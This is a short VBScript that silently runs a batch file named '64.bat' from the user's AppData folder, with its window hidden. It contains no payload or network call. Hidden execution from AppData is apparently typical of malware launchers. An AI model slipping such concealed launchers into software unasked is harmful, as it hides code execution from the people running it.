Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "%appdata%\64.bat" & Chr(34), 0
Set WshShell = Nothing